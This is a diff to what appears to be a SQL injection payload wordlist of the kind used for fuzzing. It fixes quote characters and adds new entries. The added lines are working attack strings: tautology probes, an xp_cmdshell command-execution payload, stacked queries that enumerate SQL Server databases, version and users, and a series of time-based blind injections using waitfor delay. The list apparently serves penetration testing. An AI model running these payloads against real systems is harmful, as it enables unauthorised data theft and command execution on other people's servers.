@@ -34,7 +34,6 @@ value AND 5=5
 value AND 5=0
 value OR 5=5 OR 4=0 
 value OR 5=0 OR 4=0
-
 WF'SQL"Probe;A--B 
 ' having 1=1--
 1 having 1=1--
@@ -64,8 +63,33 @@ and 0=7659
 ' and 'barfoo'= 'foobar' --
 ' or 'foobar'= 'foobar
 ' and 'foobar'= 'foobar' --
+' and 'barfoo'='foobar') --
+' and 'barfoo'='foobar
+' or 'foobar'='foobar' --
+' or 'foobar'='foobar') --
+' and 'foobar'='foobar
+' and 'foobar'='foobar') --
+'' exec master.. xp_cmdshell 'vol'--
+'; select * from dbo. sysdatabases--
+'; select @@ version,1,1,1--
+'; select * from master..sysmessages--
+'; select * from sys.dba_users--
+
+;waitfor delay '0:0:15';--
+;waitfor delay '0:0:15';--
+');waitfor delay '0:0:15';--
+);waitfor delay '0:0:15';--
+1','0');waitfor delay '0:0:15';--
+1,'0');waitfor delay '0:0:15';--
+1','0','0');waitfor delay '0:0:15';--
+1,'0','0');waitfor delay '0:0:15';--
+1','0','0','0');waitfor delay '0:0:15';--
+1,'0','0','0');waitfor delay '0:0:15';--
+1','0','0','0','0');
+waitfor delay '0:0:15';--
+
 # **for insert**
-foo’)--
-foo’, 1)--
-foo’, 1, 1)--
-foo’, 1, 1, 1)--
+foo')--
+foo', 1)--
+foo', 1, 1)--
+foo', 1, 1, 1)--
